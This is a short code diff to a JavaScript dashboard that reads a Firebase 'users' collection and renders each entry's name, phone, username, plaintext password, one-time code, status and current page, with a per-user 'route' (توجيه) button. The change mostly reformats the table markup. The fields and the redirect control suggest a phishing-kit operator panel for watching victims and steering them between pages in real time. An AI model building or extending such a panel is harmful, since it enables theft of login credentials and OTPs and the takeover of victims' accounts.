@@ -482,37 +482,43 @@ onSnapshot(collection(db,"users"),
 
     });
 
+users.forEach((user)=>{
 
-    users.forEach((user)=>{
-
-        usersTable.innerHTML += `
-        <tr>
+    usersTable.innerHTML += `
+    <tr>
 
         <td>${user.name || '-'}</td>
+
         <td>${user.phone || '-'}</td>
+
         <td>${user.username || '-'}</td>
+
         <td>${user.password || '-'}</td>
+
         <td>${user.otp || '-'}</td>
 
         <td>
-        <div class="status">
-        ${user.status || 'pending'}
-        </div>
+            <div class="status">
+                ${user.status || 'pending'}
+            </div>
         </td>
 
-        <td>${user.currentPage || '-'}</td>
-
-        </tr>
         <td>
-<button
-class="route-btn"
-onclick="openPopup('${user.id}')">
-توجيه
-</button>
-</td>
-        `;
+            ${user.currentPage || '-'}
+        </td>
 
-    });
+        <td>
+            <button
+                class="route-btn"
+                onclick="openPopup('${user.id}')">
+                توجيه
+            </button>
+        </td>
+
+    </tr>
+    `;
+
+});
 
 
 },
